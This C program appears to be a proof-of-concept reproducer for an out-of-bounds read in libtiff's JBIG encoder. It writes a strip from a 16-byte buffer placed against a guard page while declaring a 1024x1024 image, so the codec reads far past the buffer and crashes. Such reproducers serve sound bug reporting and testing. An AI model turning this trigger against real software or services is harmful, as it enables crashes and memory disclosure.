#include <tiffio.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <errno.h>

int main(void) {
    // Create a two-page mapping with the second page PROT_NONE so any read
    // beyond the end of our small buffer faults immediately.
    long pagesize = sysconf(_SC_PAGESIZE);
    if (pagesize <= 0) {
        fprintf(stderr, "sysconf(_SC_PAGESIZE) failed\n");
        return 1;
    }

    size_t map_len = (size_t)pagesize * 2;
    unsigned char *mapping = (unsigned char *)mmap(NULL, map_len, PROT_READ | PROT_WRITE,
                                                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mapping == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    if (mprotect(mapping + pagesize, (size_t)pagesize, PROT_NONE) != 0) {
        perror("mprotect");
        return 1;
    }

    // Craft a very small input buffer positioned right before the PROT_NONE page.
    const tmsize_t provided_size = 16; // Intentionally too small
    unsigned char *input = mapping + pagesize - provided_size; // last 16 bytes of first page
    memset(input, 0xFF, (size_t)provided_size);

    // Set up a TIFF for JBIG compression with dimensions requiring far more data
    // than 'provided_size'. JBIG will read ((width+7)/8) * height bytes from 'input'.
    const uint32_t width = 1024;   // bytes/row = (1024+7)/8 = 128
    const uint32_t height = 1024;  // total bytes required = 128 * 1024 = 131072

    TIFF *tif = TIFFOpen("/tmp/jbig_oob.tif", "w");
    if (!tif) {
        fprintf(stderr, "TIFFOpen failed\n");
        return 1;
    }

    // Minimize noise from libtiff while still exercising the vulnerable path
    TIFFSetWarningHandler(NULL);
    TIFFSetErrorHandler(NULL);

    if (!TIFFSetField(tif, TIFFTAG_IMAGEWIDTH, width) ||
        !TIFFSetField(tif, TIFFTAG_IMAGELENGTH, height) ||
        !TIFFSetField(tif, TIFFTAG_BITSPERSAMPLE, 1) ||
        !TIFFSetField(tif, TIFFTAG_SAMPLESPERPIXEL, 1) ||
        !TIFFSetField(tif, TIFFTAG_PLANARCONFIG, PLANARCONFIG_CONTIG) ||
        !TIFFSetField(tif, TIFFTAG_PHOTOMETRIC, PHOTOMETRIC_MINISBLACK) ||
        !TIFFSetField(tif, TIFFTAG_COMPRESSION, COMPRESSION_JBIG) ||
        !TIFFSetField(tif, TIFFTAG_ROWSPERSTRIP, height)) {
        fprintf(stderr, "TIFFSetField failed\n");
        // Continue anyway; encoder path may still be reached
    }

    // Trigger the encoder. TIFFWriteEncodedStrip forwards 'input' and 'provided_size'
    // to the codec; JBIGEncode ignores 'size' and jbg_enc_out will read based on
    // width/height, causing an OOB read into the PROT_NONE page.
    tmsize_t ret = TIFFWriteEncodedStrip(tif, 0, input, provided_size);
    (void)ret; // We expect a crash before this returns if JBIG is enabled.

    TIFFClose(tif);

    // Clean up (unlikely to be reached if the bug triggers as intended).
    munmap(mapping, map_len);
    return 0;
}
